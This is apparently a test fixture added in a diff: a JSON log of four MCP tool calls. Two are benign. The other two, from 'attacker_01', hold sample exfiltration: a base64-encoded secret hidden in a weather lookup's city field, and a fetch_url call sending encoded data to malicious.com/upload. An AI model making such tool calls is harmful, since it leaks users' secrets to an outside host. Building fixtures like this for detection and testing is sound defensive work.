@@ -1,0 +1,47 @@
+[
+  {
+    "timestamp": "2025-12-03T10:00:00Z",
+    "product": "mcp",
+    "service": "tool_execution",
+    "tool_name": "weather_lookup",
+    "parameters": {
+      "city": "London"
+    },
+    "user_id": "user_123",
+    "author": "Vikranth Kumar Shivaa"
+  },
+  {
+    "timestamp": "2025-12-03T10:05:00Z",
+    "product": "mcp",
+    "service": "tool_execution",
+    "tool_name": "fetch_url",
+    "parameters": {
+      "url": "https://example.com/search?q=meaning_of_life"
+    },
+    "user_id": "user_123",
+    "author": "Vikranth Kumar Shivaa"
+  },
+  {
+    "timestamp": "2025-12-03T10:10:00Z",
+    "product": "mcp",
+    "service": "tool_execution",
+    "tool_name": "weather_lookup",
+    "parameters": {
+      "city": "London_ZmFrZS1zdXBlci1zZWNyZXQta2V5LXZhbHVl"
+    },
+    "user_id": "attacker_01",
+    "author": "Vikranth Kumar Shivaa"
+  },
+  {
+    "timestamp": "2025-12-03T10:15:00Z",
+    "product": "mcp",
+    "service": "tool_execution",
+    "tool_name": "fetch_url",
+    "parameters": {
+      "url": "https://malicious.com/upload?data=c3VwZXJfc2VjcmV0X2RhdGE="
+    },
+    "user_id": "attacker_01",
+    "author": "Vikranth Kumar Shivaa"
+  }
+]
+
